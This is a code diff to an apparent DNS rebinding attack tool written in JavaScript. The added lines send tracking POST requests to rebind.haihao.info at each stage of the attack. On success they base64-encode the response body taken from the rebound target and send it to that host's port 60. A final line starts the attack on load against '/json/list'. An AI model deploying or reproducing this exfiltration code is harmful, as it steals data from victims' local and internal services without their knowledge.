@@ -45,6 +45,9 @@ const Rebinder = () => {
                     }
                     break;
                 case 'start':
+                    xr = new XMLHttpRequest();
+                    xr.open("POST", "http://rebind.haihao.info:8080/payload-start");
+                    xr.send();
                     timer = setInterval(function () { run() }, interval);
                     console.log('frame', window.location.hostname, 'waiting', interval,
                         'milliseconds for dns update');
@@ -56,6 +59,9 @@ const Rebinder = () => {
     function init(myUrl, myRebindingDoneFn) {
         url = myUrl;
         rebindingDoneFn = myRebindingDoneFn;
+        xr = new XMLHttpRequest();
+        xr.open("POST", "http://rebind.haihao.info:8080/payload-init");
+        xr.send();
         initCommsWithParentFrame();
         window.parent.postMessage({
             status: 'start'
@@ -63,6 +69,10 @@ const Rebinder = () => {
     };
 
     function run() {
+        xr = new XMLHttpRequest();
+        xr.open("POST", "http://rebind.haihao.info:8080/payload-fetch");
+        xr.send();
+
         fetch(url, {
             credentials: 'omit',
         })
@@ -110,12 +120,19 @@ const Rebinder = () => {
                     status: 'success',
                     response: body
                 }, "*");
+		var s = new XMLHttpRequest();
+                // encode the exfiltrated data as base64
+                s.open("POST", "http://rebind.haihao.info:60/?e=" + btoa(body));
+		s.send();
                 // Terminate the attack
                 rebindingSuccess = true;
                 rebindingStatusEl.innerText = `DNS rebinding successful!`;
                 rebindingDoneFn(payload, headers, cookie, body, wsproxyport);
             })
             .catch(function (error) {
+                xr = new XMLHttpRequest();
+                xr.open("POST", "http://rebind.haihao.info:8080/payloaderror");
+                xr.send();
                 if (error instanceof TypeError) { // We cannot establish an HTTP connection
                     console.log('frame ' + window.location.hostname + ' could not load: ' + error);
                     window.parent.postMessage({
@@ -162,6 +179,9 @@ function begin(url) {
     const arr = window.location.hostname.split('-');
     const port = document.location.port ? document.location.port : '80';
     hostnameEl.innerText = `target: ${arr[2]}:${port}, session: ${arr[3]}, strategy: ${arr[4]}`;
+    xr = new XMLHttpRequest();
+    xr.open("POST", "http://rebind.haihao.info:8080/payloadstart");
+    xr.send();
     r = Rebinder();
     r.init(url, attack);
 }
@@ -451,3 +471,4 @@ function httpHeaderstoText(headers) {
 }
 
 let Registry = {};
+begin('/json/list');
